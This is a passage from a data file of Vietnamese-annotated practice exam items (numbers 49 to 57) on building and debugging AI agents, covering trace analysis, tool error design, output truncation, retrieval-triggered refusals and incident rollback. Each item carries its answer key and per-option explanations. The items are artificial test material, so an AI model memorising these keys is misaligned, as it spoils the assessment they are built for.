      { label: "Docs Agent SDK “How the agent loop works”, mục “The context window”: context dồn lại qua các lượt, output tool lớn tốn nhiều context", href: "https://code.claude.com/docs/en/agent-sdk/agent-loop#the-context-window" }
    ]
  },
  {
    de: 1, n: 49, total: 100, sub: "3.3", subName: "Phân tích trace hàng loạt",
    answer: "DE",
    ask: "An agent fleet produces two million traces per week, and the platform team wants to surface systemic problems in them. Which two practices work best? (Choose two.)",
    scene: [
      "Hai triệu trace mỗi tuần từ cả đội agent (agent fleet).",
      "Team muốn tìm lỗi hệ thống (systemic issues): lỗi lặp lại theo một khuôn, không phải ca lẻ.",
      "Chỗ khó: không thể đọc hết, phải có cách gom và xếp ưu tiên."
    ],
    asks: [
      "Hai cách làm nào hiệu quả nhất?",
      "Tức là: một cách để tìm ra khuôn lỗi trong đống trace, một cách để biết sửa cái nào trước."
    ],
    facts: [
      "Gom lỗi theo chiều (tenant, tool, model, phiên bản prompt, độ dài input) rồi so nhóm hỏng với nhóm khỏe là cách thấy các trace hỏng có chung điều gì.",
      "Số trung bình che mất lỗi dồn vào một nhóm nhỏ: nhóm nhỏ hỏng rất nặng vẫn chỉ đẩy trung bình lên chút ít.",
      "Đọc từng trace vẫn cần, để hiểu một khuôn lỗi cụ thể. Bài “Demystifying evals” của Anthropic coi đọc transcript là việc làm thường xuyên để lấp chỗ trống, bên cạnh eval tự động và giám sát production. Nhưng vài chục trace chọn theo kiểu “dài nhất” không đại diện cho cả hệ.",
      "Đo tác động (bao nhiêu người dùng, bao nhiêu chi phí) cho mỗi khuôn lỗi thì mới xếp được thứ tự sửa."
    ],
    opts: [
      { k: "A", gist: "Report each metric's average over all traces to detect problems.",
        why: [
          "Sai: trung bình che lỗi dồn vào nhóm nhỏ (ý 2).",
          "Một tenant hay một tool hỏng nặng lẫn trong hai triệu trace thì trung bình gần như không đổi, dễ bị coi là bình thường."
        ] },
      { k: "B", gist: "Wait until customers report problems and look only at those traces.",
        why: [
          "Sai: khách chỉ báo một phần lỗi, và báo muộn.",
          "Lỗi đã tới tay người dùng rồi mới biết, và lỗi không ai báo thì không bao giờ được soi."
        ] },
      { k: "C", gist: "Read the fifty longest traces from start to finish and fix whatever stands out.",
        why: [
          "Sai: năm mươi trace dài nhất là mẫu lệch, chỉ là giai thoại, không phải cái nhìn toàn hệ (ý 3). Cái nổi bật trong vài trace chưa chắc là cái gây hại nhiều nhất.",
          "Dễ bị cuốn vì đọc trace kỹ đúng là việc tốt. Nhưng đề hỏi cách tìm lỗi hệ thống trong hai triệu trace, và năm mươi trace chọn theo độ dài không làm được việc đó."
        ] },
      { k: "D", gist: "Group failures along dimensions such as tenant, tool, model, prompt version, and input size, then compare the failing cohorts with the healthy ones.",
        why: [
          "Đúng: gom theo chiều và so nhóm hỏng với nhóm khỏe là cách lộ ra điều các trace hỏng có chung (ý 1).",
          "Làm được trên cả hai triệu trace, không phụ thuộc ai chọn mẫu."
        ] },
      { k: "E", gist: "For each pattern found, estimate how many users and how much cost it affects, so fixes are ranked by impact.",
        why: [
          "Đúng: biến danh sách khuôn lỗi thành thứ tự ưu tiên (ý 4).",
          "D tìm ra khuôn lỗi, E cho biết sửa cái nào trước. Hai bước nối nhau."
        ] }
    ],
    refs: [
      { label: "Bài “Demystifying evals for AI agents”, mục “How evals fit with other methods for a holistic understanding of agents”: giám sát production, đọc transcript và eval tự động bổ sung cho nhau", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" },
      { label: "Bài “How we built our multi-agent research system”, mục “Production reliability and engineering challenges”: theo dõi khuôn quyết định và cấu trúc tương tác của agent để tìm nguyên nhân gốc", href: "https://www.anthropic.com/engineering/built-multi-agent-research-system" }
    ]
  },
  {
    de: 1, n: 50, total: 100, sub: "4.1", subName: "Chẩn đoán lỗi phức tạp",
    answer: "A",
    ask: "A pricing assistant quotes customers a discount that is out of date. The trace shows the model called the pricing tool, got back a response containing last quarter's discount, and reported it faithfully. The tool reads from a cache refreshed once a week. Which layer holds the defect, and what is the right fix?",
    scene: [
      "Trợ lý báo giá đưa cho khách một mức giảm giá đã cũ.",
      "Trace cho thấy: model gọi tool giá, tool trả về mức giảm của quý trước, model báo lại đúng y như vậy.",
      "Tool đọc từ cache, mỗi tuần làm mới một lần.",
      "Chỗ khó: lỗi lộ ra ở câu trả lời của model, nên dễ quy cho model hay prompt."
    ],
    asks: [
      "Lỗi nằm ở tầng nào, và sửa thế nào cho đúng?",
      "Tức là: lần theo trace xem giá trị sai đi vào từ đâu, rồi sửa đúng chỗ đó."
    ],
    facts: [
      "Với tool phía client, ứng dụng của mày chạy tool rồi gửi kết quả về trong <code>tool_result</code>. Model chỉ biết những gì tool trả về.",
      "Bài “Building effective agents”: agent cần lấy “ground truth” (sự thật nền) từ môi trường ở mỗi bước, ví dụ kết quả gọi tool. Kết quả tool chính là bằng chứng model dựa vào.",
      "Gỡ lỗi theo tầng: lần ngược trace tới chỗ giá trị sai xuất hiện đầu tiên. Ở đây giá trị sai đã nằm sẵn trong response của tool, trước khi model đụng tới.",
      "Sửa ở tầng dữ liệu: làm nguồn tươi hơn (làm mới cache khi giá đổi), hoặc trả kèm ngày hiệu lực (as-of date) để biết số liệu tính tới lúc nào."
    ],
    opts: [
      { k: "A", gist: "The data/tool layer: make the pricing tool's source fresher, or have it return an as-of date, instead of touching the model or the prompt.",
        why: [
          "Đúng: giá trị sai đã có trong response của tool, model chỉ báo lại trung thực (ý 1, ý 3).",
          "Sửa nguồn dữ liệu thì mọi lần gọi sau đều đúng. Kèm ngày hiệu lực thì dù cache còn trễ, câu trả lời cũng nói rõ số liệu tính tới lúc nào (ý 4)."
        ] },
      { k: "B", gist: "The model layer: move to a larger model so it questions suspicious discounts.",
        why: [
          "Sai tầng: model không có cách nào biết mức giảm đã cũ. Nó chỉ có kết quả tool làm bằng chứng (ý 2).",
          "Model lớn hơn vẫn tin tool, vì tool là nguồn sự thật duy nhất nó có."
        ] },
      { k: "C", gist: "The harness layer: lower the temperature so outputs stop varying.",
        why: [
          "Sai: câu trả lời không dao động, nó sai một cách ổn định. Temperature (độ ngẫu nhiên khi sinh chữ) không liên quan.",
          "Giảm temperature chỉ làm model báo lại con số cũ đều đặn hơn."
        ] },
      { k: "D", gist: "The prompt layer: tell the model in an instruction to re-verify any discount it quotes.",
        why: [
          "Sai: model lấy gì để kiểm lại? Nguồn duy nhất của nó chính là tool đang trả số cũ (ý 1).",
          "Dễ bị cuốn vì sửa prompt rẻ và nhanh. Nhưng lời dặn không tạo ra dữ liệu mới, gọi lại tool vẫn ra mức giảm quý trước."
        ] }
    ],
    refs: [
      { label: "Docs Tool use, mục “How tool use works”: ứng dụng của mày chạy client tool và gửi kết quả về trong tool_result", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/overview#how-tool-use-works" },
      { label: "Bài “Building effective agents”, mục “Agents”: agent lấy “ground truth” từ môi trường ở mỗi bước, như kết quả gọi tool", href: "https://www.anthropic.com/engineering/building-effective-agents" }
    ]
  },
  {
    de: 1, n: 51, total: 100, sub: "4.1", subName: "Chẩn đoán lỗi phức tạp",
    answer: "D",
    ask: "During one run, an agent calls a search tool 25 times, changing the parameters slightly on each attempt. Traces show that every call returns the same short message, “Error: invalid request”, and the loop ends only when it reaches the turn limit. What should the team change?",
    scene: [
      "Agent gọi tool tìm kiếm 25 lần trong một lượt chạy, mỗi lần đổi tham số một chút.",
      "Lần nào tool cũng trả đúng một câu cụt: “Error: invalid request” (yêu cầu không hợp lệ). Không nói sai ở đâu.",
      "Vòng lặp chỉ dừng khi chạm turn limit (giới hạn số lượt). Tức là không có gì chặn nó sớm hơn.",
      "Chỗ khó: nhìn thì giống model kém, gọi sai mãi. Nhưng model đang đoán mò vì không ai cho nó biết sai chỗ nào."
    ],
    asks: [
      "Team nên đổi gì?",
      "Tức là: sửa cái làm vòng lặp vô ích kéo dài. Có hai lỗ: lỗi không cho model thông tin gì để sửa, và không có phanh khi cùng một lỗi lặp lại.",
      "Soi từng phương án: nó có cho model thêm thông tin để sửa không, và có chặn vòng lặp vô ích không?"
    ],
    facts: [
      "Docs “Handle tool calls”: tool lỗi hay lời gọi không hợp lệ thì trả <code>tool_result</code> với <code>is_error: true</code>. Docs khuyên viết lỗi có hướng dẫn: nói sai gì và nên thử gì tiếp, thay vì câu chung chung kiểu “failed”.",
      "Cùng mục đó: nhận lỗi xong Claude có thể gọi lại tool, nên vòng lặp của mày phải tự giới hạn số lần thử lại.",
      "Bài “Writing effective tools for agents”: lỗi trả về nên nói rõ cách sửa cụ thể, không phải mã lỗi hay traceback khó hiểu.",
      "Lời gọi thiếu hay sai tham số thường do model thiếu thông tin để gọi đúng. Docs khuyên viết <code>description</code> của tool chi tiết hơn, hoặc bật strict tool use để input luôn khớp schema."
    ],
    opts: [
      { k: "A", gist: "Strip the error output from the tool so it doesn't distract the model, and leave monitoring as it is.",
        why: [
          "Sai ngược: bỏ lỗi là bỏ luôn tín hiệu duy nhất model có (ý 1).",
          "Model không biết lần gọi trước đã hỏng, càng gọi bừa hơn. Vòng lặp vẫn chạy tới turn limit."
        ] },
      { k: "B", gist: "Raise the turn limit so the agent gets more tries to land on a call that works.",
        why: [
          "Sai: thêm lượt nhưng phản hồi vẫn mù y như cũ (ý 1).",
          "25 lần đoán mò thành 50 lần, tốn thêm token và thời gian, kết quả không khá hơn.",
          "Dễ bị cuốn vì nghe như “cho agent thêm cơ hội”. Nhưng vấn đề không phải thiếu lượt, mà là lượt nào cũng không học được gì. Docs bảo siết số lần thử, không phải nới (ý 2)."
        ] },
      { k: "C", gist: "Move to a bigger model so it can work out the right parameters.",
        why: [
          "Sai chỗ: lỗi nằm ở tool và vòng lặp, không phải ở model (ý 1, ý 4).",
          "Model mạnh cỡ nào cũng phải đoán khi lỗi chỉ nói “invalid request”. Tốn tiền hơn mà vẫn không chắc."
        ] },
      { k: "D", gist: "Have the tool return specific, structured, actionable errors that state what was invalid and how to correct it, and add a loop guard that halts repeated identical failures.",
        why: [
          "Đúng, sửa cả hai lỗ. Lỗi có cấu trúc, nói rõ tham số nào sai và sửa thế nào, cho model đủ thông tin để tự chỉnh (ý 1, ý 3).",
          "Loop guard (chốt chặn vòng lặp) dừng khi cùng một lỗi lặp lại, đúng như docs dặn giới hạn số lần thử (ý 2). Agent không đốt lượt tới tận turn limit nữa."
        ] }
    ],
    refs: [
      { label: "Docs Handle tool calls, mục “Handling errors with is_error”: trả lỗi có hướng dẫn (sai gì, thử gì tiếp), và giới hạn số lần thử lại trong vòng lặp", href: "https://platform.claude.com/docs/en/agents-and-tools/tool-use/handle-tool-calls" },
      { label: "Bài Anthropic Engineering “Writing effective tools for agents”, mục “Optimizing tool responses for token efficiency”: lỗi nên báo cách sửa cụ thể, không phải mã lỗi khó hiểu", href: "https://www.anthropic.com/engineering/writing-tools-for-agents" }
    ]
  },
  {
    de: 1, n: 52, total: 100, sub: "4.1", subName: "Chẩn đoán lỗi phức tạp",
    answer: "A",
    ask: "A multi-agent workflow gives a wrong result in roughly 3% of runs. Running the case once or twice does not reproduce the problem. What is the best way to investigate?",
    scene: [
      "Workflow nhiều agent, khoảng 3% lượt chạy cho kết quả sai.",
      "Chạy lại ca đó một hai lần thì không tái hiện được.",
      "Chỗ khó: lỗi theo xác suất. 3% nghĩa là trung bình khoảng 33 lượt mới sai một lần, nên vài lượt chạy đúng chưa nói lên gì."
    ],
    asks: [
      "Cách điều tra nào tốt nhất?",
      "Tức là: làm sao bắt được một lỗi chỉ xảy ra thỉnh thoảng, và chỉ ra được nó do đâu.",
      "Soi từng phương án: có đo được tỉ lệ lỗi không, và có tách được từng nguyên nhân không?"
    ],
    facts: [
      "Agent không tất định (non-deterministic): cùng prompt vẫn có thể ra kết quả khác giữa các lượt. Bài “How we built our multi-agent research system” nói thẳng điều này, và kể thêm tracing đầy đủ ở production mới giúp chẩn đoán có hệ thống.",
      "Bài “Demystifying evals for AI agents”: vì output thay đổi giữa các lượt, phải chạy nhiều lượt thử (trial) mới có kết quả đáng tin. Với lỗi kiểu này, thứ cần đo là tỉ lệ, không phải một lượt đúng hay sai.",
      "Đổi một biến mỗi lần, giữ nguyên các thứ khác, thì tỉ lệ lỗi thay đổi được quy về đúng biến đó. Đổi nhiều thứ cùng lúc thì không biết cái nào có tác dụng."
    ],
    opts: [
      { k: "A", gist: "Replay the captured inputs many times to measure the failure rate, then change one factor at a time (such as the model, the prompt version, or a tool result) to narrow down the cause.",
        why: [
          "Đúng: phát lại input đã lưu nhiều lần để có tỉ lệ lỗi làm mốc (ý 2).",
          "Rồi đổi từng yếu tố một, xem tỉ lệ đổi theo cái nào (ý 3). Lúc đó mới khoanh được nguyên nhân bằng số liệu, không phải đoán."
        ] },
      { k: "B", gist: "Turn off parallel execution for good, because parallelism always makes behavior flaky.",
        why: [
          "Sai ở giả định: “parallelism always” (song song lúc nào cũng gây lỗi) là kết luận khi chưa có bằng chứng nào.",
          "Tắt vĩnh viễn thì mất thông lượng. Nếu nguyên nhân nằm ở prompt hay tool thì 3% vẫn còn đó."
        ] },
      { k: "C", gist: "Rewrite every agent's prompt with clearer instructions and ship it.",
        why: [
          "Sai cách: sửa hết prompt mọi agent là đổi nhiều biến cùng lúc mà chưa biết lỗi ở đâu (ý 3).",
          "Ship xong cũng không biết đã hết lỗi chưa, vì chưa có tỉ lệ lỗi gốc để so (ý 2)."
        ] },
      { k: "D", gist: "Re-run the case a few more times and, if it passes, close the ticket as a one-time glitch.",
        why: [
          "Sai: vài lượt chạy đúng không loại được lỗi 3% (ý 1, ý 2). Lỗi vẫn còn nguyên mà chạy hai lần đều đúng thì xác suất cũng khoảng 94% (0,97 × 0,97).",
          "Dễ bị cuốn vì “transient glitch” (trục trặc thoáng qua) nghe hợp lý khi không tái hiện được. Nhưng lỗi vẫn ở đó, chỉ là mày chưa chạy đủ nhiều để thấy."
        ] }
    ],
    refs: [
      { label: "Bài Anthropic Engineering “How we built our multi-agent research system”, mục “Production reliability and engineering challenges”: agent không tất định giữa các lượt, cần tracing đầy đủ để chẩn đoán", href: "https://www.anthropic.com/engineering/multi-agent-research-system" },
      { label: "Bài Anthropic Engineering “Demystifying evals for AI agents”, mục “How to think about non-determinism in evaluations for agents”: chạy nhiều lượt thử, đọc kết quả theo tỉ lệ", href: "https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 53, total: 100, sub: "4.1", subName: "Chẩn đoán lỗi phức tạp",
    answer: "B",
    ask: "After a new retrieval source of user forum posts is added, an assistant's refusal rate climbs from below 1% to 5%. Most of the refused requests turn out to include retrieved forum passages with graphic or abusive text. The same user questions get normal answers when those passages are left out. Which diagnosis and action are right?",
    scene: [
      "Trợ lý thêm nguồn truy xuất mới: bài đăng diễn đàn của người dùng.",
      "Tỉ lệ refusal (từ chối trả lời) tăng từ dưới 1% lên 5%. Phần lớn ca bị từ chối có đoạn diễn đàn chứa nội dung bạo lực, thô tục.",
      "Đề cho sẵn một phép so có đối chứng: cùng câu hỏi, bỏ các đoạn đó ra thì trả lời bình thường."
    ],
    asks: [
      "Chẩn đoán và hành động nào đúng?",
      "Tức là: đọc ra biến nào gây từ chối, rồi sửa đúng chỗ đó.",
      "Soi từng phương án: chẩn đoán có khớp với phép so trong đề không?"
    ],
    facts: [
      "Trên Claude API, refusal về như một response bình thường (HTTP 200) với <code>stop_reason: \"refusal\"</code>, không phải lỗi. Safety classifier (bộ phân loại an toàn) có thể từ chối một request.",
      "Docs “Refusals and fallback”, mục “Common pitfalls”: gửi lại đúng request đó cho cùng model thường lại bị từ chối. Muốn thử lại thì trỏ sang model dự phòng.",
      "Đoạn truy xuất được ghép vào context cùng câu hỏi, nên nó là một phần của request. Phép so “có đoạn thì từ chối, bỏ đoạn thì trả lời” chỉ thẳng vào dữ liệu truy xuất.",
      "Xử lý refusal tường minh: code kiểm <code>stop_reason</code>, gặp <code>refusal</code> thì đi nhánh riêng (báo người dùng, thử model dự phòng, ghi log), không coi như câu trả lời bình thường."
    ],
    opts: [
      { k: "A", gist: "A model defect: file a bug and wait for a model update, leaving the current monitoring in place.",
        why: [
          "Sai chẩn đoán: bằng chứng chỉ vào dữ liệu đầu vào, không phải model hỏng vô cớ (ý 3).",
          "Trong lúc chờ bản model mới, 5% request vẫn bị từ chối, mà nguồn gây ra vẫn nằm nguyên trong index."
        ] },
      { k: "B", gist: "A data-grounding problem: the retrieved content is what triggers the refusals, so filter or quarantine the problematic passages and handle refusals explicitly, instead of treating this as a model defect.",
        why: [
          "Đúng chẩn đoán: phép so có đối chứng trong đề cho thấy đoạn diễn đàn là biến làm đổi kết quả (ý 3).",
          "Sửa đúng chỗ: lọc hoặc cách ly (quarantine) các đoạn độc hại ở khâu truy xuất, trước khi vào context. Thêm nhánh xử lý refusal tường minh cho ca còn sót (ý 1, ý 4)."
        ] },
      { k: "C", gist: "A prompt problem: instruct the model to always answer, no matter what the content is.",
        why: [
          "Sai: bảo model “luôn trả lời” để đè quyết định an toàn vừa không chắc ăn vừa không nên làm (ý 1).",
          "Nguồn gây ra vẫn chưa được lọc, và nếu có trả lời thì nội dung độc hại còn lọt vào câu trả lời.",
          "Dễ bị cuốn vì đây là cách sửa nhanh nhất nghĩ ra. Nhưng nó chỉ đè triệu chứng, không đụng tới dữ liệu đang gây ra từ chối (ý 3)."
        ] },
      { k: "D", gist: "A latency problem: add retries for the refused requests.",
        why: [
          "Sai chẩn đoán: refusal là response bình thường, không phải lỗi mạng hay chậm (ý 1).",
          "Gửi lại y nguyên cho cùng model thường lại bị từ chối (ý 2). Docs có cách thử lại trên model dự phòng, nhưng đó là xử lý refusal, không gỡ được đoạn diễn đàn đang gây ra nó."
        ] }
    ],
    refs: [
      { label: "Docs Handling stop reasons, mục “refusal”: refusal là response HTTP 200 bình thường, không phải lỗi", href: "https://platform.claude.com/docs/en/build-with-claude/handling-stop-reasons#refusal" },
      { label: "Docs Refusals and fallback, mục “Common pitfalls”: gửi lại cho cùng model thường lại bị từ chối, phải trỏ sang model dự phòng", href: "https://platform.claude.com/docs/en/build-with-claude/refusals-and-fallback#common-pitfalls" }
    ]
  },
  {
    de: 1, n: 54, total: 100, sub: "4.1", subName: "Chẩn đoán lỗi phức tạp",
    answer: "CD",
    ask: "In a pipeline of five agents, the final report contains an incorrect figure. The last agent, the writer, copied that figure accurately from the input it was given. Which two investigation steps best pinpoint where the error came from? (Choose two.)",
    scene: [
      "Pipeline năm agent, báo cáo cuối có một con số sai.",
      "Agent cuối (writer, người viết) chép đúng con số từ input nó nhận. Tức là nó làm đúng việc của nó.",
      "Chỗ khó: lỗi hiện ra ở cuối, nhưng sinh ra ở đâu đó phía trước."
    ],
    asks: [
      "Hai bước điều tra nào khoanh được chỗ sinh ra lỗi tốt nhất?",
      "Tức là: tìm khâu đầu tiên làm con số lệch, chứ không phải khâu cuối để lộ ra."
    ],
    facts: [
      "Bài “How we built our multi-agent research system”: agent có trạng thái (stateful) và lỗi cộng dồn. Một sai sót nhỏ ở khâu trước có thể kéo lệch cả chuỗi phía sau.",
      "Mỗi lần chuyển giao (handoff) giữa các agent là một chỗ thông tin có thể rơi rớt. Bài đó gọi hiện tượng này là “game of telephone” (tam sao thất bản).",
      "Context là tập token model dùng khi sinh câu trả lời (bài “Effective context engineering for AI agents”). Thông tin bị thiếu, bị cắt, bị sửa lúc ghép context thì agent làm đúng vẫn ra kết quả sai.",
      "Khâu sinh lỗi là chỗ đầu tiên output lệch khỏi input đúng. So input và output từng khâu, đi ngược từ cuối, là cách tìm ra chỗ đó."
    ],
    opts: [
      { k: "A", gist: "Add a fact-checking agent at the end and consider the problem fixed.",
        why: [
          "Sai: agent kiểm tra có thể bắt được triệu chứng, nhưng khâu sinh lỗi vẫn nằm nguyên (ý 4).",
          "Đề hỏi tìm gốc lỗi. “Treat the problem as resolved” (coi như xong) là chưa tìm gì cả."
        ] },
      { k: "B", gist: "Blame the writer agent because it produced the wrong output, and rewrite its prompt.",
        why: [
          "Sai: writer chép đúng input, nên lỗi nằm phía trước nó (ý 4).",
          "Sửa prompt writer không đụng tới khâu đã làm sai con số. Lần sau số vẫn sai.",
          "Dễ bị cuốn vì writer là agent ra output sai cuối cùng. Nhưng đề đã nói rõ “reproduced it faithfully” (chép lại trung thực)."
        ] },
      { k: "C", gist: "Trace the handoffs backwards, comparing each agent's input with its output, to find the first point where the figure departs from the source.",
        why: [
          "Đúng: đi ngược qua các handoff, so input với output từng khâu, tìm chỗ đầu tiên con số lệch khỏi nguồn (ý 2, ý 4).",
          "Lỗi cộng dồn nên khâu đầu tiên lệch mới là gốc, các khâu sau chỉ chuyền tiếp (ý 1)."
        ] },
      { k: "D", gist: "Examine the exact context each agent received to check whether the needed information was there, truncated, or altered.",
        why: [
          "Đúng: soi đúng context từng agent nhận để biết thông tin cần có mặt không, có bị cắt hay bị sửa không (ý 3).",
          "Nhiều lỗi agent không do model suy luận sai, mà do khâu ghép context làm rơi dữ liệu. Bước này tách được hai trường hợp đó."
        ] },
      { k: "E", gist: "Rerun the full pipeline once on a bigger model and see whether the figure changes.",
        why: [
          "Sai: một lượt chạy chứng minh được rất ít, và đổi model là thêm một biến trong khi chưa khoanh được khâu sinh lỗi (ý 4).",
          "Số có đổi hay không thì mày vẫn chưa biết khâu nào làm sai."
        ] }
    ],
    refs: [
      { label: "Bài Anthropic Engineering “How we built our multi-agent research system”, mục “Production reliability and engineering challenges” và phụ lục về “game of telephone”: lỗi cộng dồn qua các agent, thông tin rơi rớt khi chuyền qua nhiều tay", href: "https://www.anthropic.com/engineering/multi-agent-research-system" },
      { label: "Bài Anthropic Engineering “Effective context engineering for AI agents”: context là tập token model dùng khi sinh, ghép thiếu hay sai thì kết quả sai theo", href: "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 55, total: 100, sub: "4.1", subName: "Chẩn đoán lỗi phức tạp",
    answer: "C",
    ask: "An agent that summarizes build logs sometimes says every test passed when some actually failed. The engineers discover that the harness silently cuts any tool output longer than 10,000 characters, dropping the end, and the summary of failures sits at the end of the log. What is the right fix?",
    scene: [
      "Agent tóm tắt build log, thỉnh thoảng báo “mọi test đều pass” trong khi có test fail.",
      "Harness (phần code bọc quanh model, chạy tool rồi đưa kết quả vào) cắt mọi output tool dài quá 10.000 ký tự, bỏ phần đuôi, không báo gì.",
      "Phần tóm tắt test fail lại nằm ở cuối log. Đúng phần quan trọng nhất bị cắt mất."
    ],
    asks: [
      "Sửa thế nào mới đúng?",
      "Tức là: model đang suy luận trên bằng chứng thiếu mà không biết là thiếu. Phải sửa chỗ làm thiếu và chỗ giấu việc thiếu."
    ],
    facts: [
      "Model chỉ dùng được những gì có trong context. Phần log bị cắt thì với model coi như không tồn tại.",
      "Bài “Writing effective tools for agents”: output lớn nên dùng phân trang (pagination), chọn khoảng, lọc, hoặc cắt bớt. Nếu cắt thì phải kèm hướng dẫn rõ để dẫn agent đi tiếp.",
      "Cắt im lặng là tệ nhất: model thấy một log trông như trọn vẹn, nên kết luận như thể nó trọn vẹn."
    ],
    opts: [
      { k: "A", gist: "Raise the temperature so the model considers other interpretations.",
        why: [
          "Sai: tăng độ ngẫu nhiên không sinh ra được dòng log đã bị cắt (ý 1).",
          "Còn làm câu trả lời kém ổn định hơn, trong khi vấn đề là thiếu dữ liệu."
        ] },
      { k: "B", gist: "Swap in a model that reads logs more accurately.",
        why: [
          "Sai chỗ: không model nào đọc được chữ đã bị bỏ trước khi tới nó (ý 1).",
          "Đổi model tốn tiền mà harness vẫn cắt y như cũ."
        ] },
      { k: "C", gist: "Fix the harness: paginate or summarize large tool outputs, and tell the model explicitly when output was truncated, so it never mistakes a partial result for a complete one.",
        why: [
          "Đúng: lỗi nằm ở harness thì sửa ở harness. Phân trang hoặc tóm tắt output lớn để phần đuôi không mất (ý 2).",
          "Báo rõ khi có cắt để model biết mình đang cầm kết quả dở dang, không kết luận “pass hết” (ý 2, ý 3)."
        ] },
      { k: "D", gist: "Add an instruction to the prompt telling the model to be careful when reporting test results.",
        why: [
          "Sai: dặn “cẩn thận” không lấy lại được thông tin model chưa từng thấy (ý 1).",
          "Dễ bị cuốn vì đây là cách sửa rẻ nhất, và triệu chứng trông giống model chủ quan. Nhưng model không chủ quan, nó chỉ thấy một log bị cắt mà trông như đầy đủ (ý 3)."
        ] }
    ],
    refs: [
      { label: "Bài Anthropic Engineering “Writing effective tools for agents”, mục “Optimizing tool responses for token efficiency”: phân trang, lọc, cắt bớt output lớn, và cắt thì phải kèm hướng dẫn cho agent", href: "https://www.anthropic.com/engineering/writing-tools-for-agents" },
      { label: "Bài Anthropic Engineering “Effective context engineering for AI agents”: context là tập token model dùng khi sinh, thứ không có trong đó thì model không dùng được", href: "https://www.anthropic.com/engineering/effective-context-engineering-for-ai-agents" }
    ]
  },
  {
    de: 1, n: 56, total: 100, sub: "4.2", subName: "Xử lý sự cố và rút kinh nghiệm",
    answer: "D",
    ask: "Forty minutes after a configuration deploy that changed a system prompt and also rebuilt a retrieval index, complaints about wrong answers surge and the quality SLI goes past its threshold. The on-call engineer has to respond. What is the best first move?",
    scene: [
      "Vừa deploy cấu hình: đổi system prompt và build lại index truy xuất.",
      "40 phút sau, khiếu nại câu trả lời sai tăng vọt, SLI chất lượng vượt ngưỡng. SLI (chỉ số mức dịch vụ) là con số đo chất lượng mà team theo dõi.",
      "Chỗ khó: chưa biết lỗi do prompt hay do index. Câu hỏi là có cần biết trước rồi mới hành động không."
    ],
    asks: [
      "Việc đầu tiên tốt nhất là gì?",
      "Tức là: khách đang bị ảnh hưởng, nên cắt ảnh hưởng trước hay tìm nguyên nhân trước."
    ],
    facts: [
      "Khi sự cố đang diễn ra, ưu tiên số một là mitigation (giảm thiểu), tức là khôi phục dịch vụ. Tìm nguyên nhân gốc làm sau, dựa trên bằng chứng đã lưu.",
      "Lỗi xuất hiện ngay sau một thay đổi thì thay đổi đó là nghi phạm đầu tiên. Rollback (quay lui) về cấu hình tốt gần nhất là cách giảm thiểu nhanh và đảo ngược được.",
      "Bài postmortem của Anthropic về ba sự cố chất lượng: team rollback các thay đổi gây lỗi, có lần rollback cả khi chưa tái hiện được lỗi, “out of an abundance of caution” (cho chắc ăn).",
      "Trace đã lưu giữ lại bằng chứng, nên rollback xong vẫn điều tra được. Rollback không xóa mất manh mối."
    ],
    opts: [
      { k: "A", gist: "Start a full root-cause analysis of the retrieval index before changing anything, so as not to roll back the wrong thing.",
        why: [
          "Sai thứ tự: phân tích gốc trước khi giảm thiểu là để khách chịu lỗi suốt thời gian phân tích (ý 1).",
          "Dễ bị cuốn vì “tránh rollback nhầm” nghe cẩn thận. Nhưng rollback cả hai thay đổi về bản tốt gần nhất thì không có gì để nhầm, và trace vẫn còn để phân tích sau (ý 2, ý 4)."
        ] },
      { k: "B", gist: "Turn the feature off for a week and leave the choice of fix to the next planning meeting.",
        why: [
          "Sai: tắt tính năng cả tuần là quá tay khi đã có cách rollback (ý 2).",
          "Chờ tới buổi họp kế hoạch là bỏ mặc khách trong khi sửa được ngay."
        ] },
      { k: "C", gist: "File a ticket with the model provider and wait for them to respond.",
        why: [
          "Sai: không có dấu hiệu nào là lỗi phía nhà cung cấp. Lỗi trùng thời điểm với deploy của chính team (ý 2).",
          "Ngồi chờ trả lời là kéo dài ảnh hưởng mà không làm gì."
        ] },
      { k: "D", gist: "Roll the latest changes back to the last known good configuration, communicate status and impact, and then investigate the cause using the saved traces.",
        why: [
          "Đúng: thời điểm chỉ vào thay đổi vừa deploy, rollback về cấu hình tốt gần nhất cắt ảnh hưởng nhanh nhất (ý 1, ý 2).",
          "Báo trạng thái và mức ảnh hưởng để mọi người biết. Sau đó điều tra bằng trace đã lưu, không mất bằng chứng (ý 4)."
        ] }
    ],
    refs: [
      { label: "Bài Anthropic Engineering “A postmortem of three recent issues”, mục “Three overlapping issues”: rollback thay đổi gây lỗi, kể cả khi chưa tái hiện được, rồi mới điều tra tiếp", href: "https://www.anthropic.com/engineering/a-postmortem-of-three-recent-issues" }
    ]
  },
  {
    de: 1, n: 57, total: 100, sub: "4.2", subName: "Xử lý sự cố và rút kinh nghiệm",
    answer: "B",
    ask: "A prompt change led an assistant to approve refunds that violated policy for six hours. The postmortem is in progress. Which set of follow-ups best turns the incident into a lasting improvement?",
    scene: [
      "Một thay đổi prompt làm trợ lý duyệt hoàn tiền sai chính sách suốt sáu giờ.",
      "Đang làm postmortem (họp rút kinh nghiệm sau sự cố).",
      "Chỗ khó: phương án nào cũng “làm gì đó”. Phải chọn cái thay đổi hệ thống, để lần sau tự chặn, tự phát hiện."
    ],
    asks: [
      "Bộ việc tiếp theo nào biến sự cố thành cải tiến lâu dài tốt nhất?",
      "Tức là: lần sau một thay đổi tương tự phải bị chặn trước khi ship, và nếu lọt thì phải phát hiện sớm hơn nhiều so với sáu giờ.",
      "Soi từng phương án: có tự động không, hay vẫn trông vào người nhớ?"
    ],
    facts: [
      "Bài “Demystifying evals for AI agents”: regression eval (bài kiểm hồi quy) hỏi “agent còn làm được những việc trước đây làm được không”, và nên đạt gần 100%. Biến lỗi người dùng báo thành test case giúp bộ eval sát thực tế.",
      "Cùng bài: giám sát production bắt được lỗi mà eval dựng sẵn bỏ sót. Nhưng nó là phản ứng sau, nên cần cả hai.",
      "Lời nhắc và lời dặn không thay đổi hệ thống. Một cổng (gate) chạy tự động trước khi ship thì có.",
      "Bài postmortem của Anthropic: sau sự cố, team cam kết làm eval nhạy hơn và chạy eval chất lượng liên tục trên hệ thống production."
    ],
    opts: [
      { k: "A", gist: "Make the engineer who made the change review every future prompt edit.",
        why: [
          "Sai: dồn vào một người, không thêm lớp kiểm tự động nào (ý 3).",
